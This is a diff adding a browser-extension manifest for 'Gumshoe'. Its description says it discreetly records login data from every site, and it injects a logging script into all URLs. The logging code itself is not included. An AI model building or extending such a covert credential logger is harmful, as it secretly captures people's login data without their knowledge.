@@ -1,0 +1,17 @@
+{
+    "name": "Gumshoe",
+    "version": "2.0",
+    "description": "Discreetly record global login data to local storage.",
+    "icons": {
+      "128": "img/icon128.png",
+      "48": "img/icon48.png"
+    },
+    "permissions": ["tabs"],
+    "background_page": "html/background.html",
+    "content_scripts": [
+      {
+        "matches": ["<all_urls>"],
+        "js": ["js/log.js"]
+      }
+    ]
+}
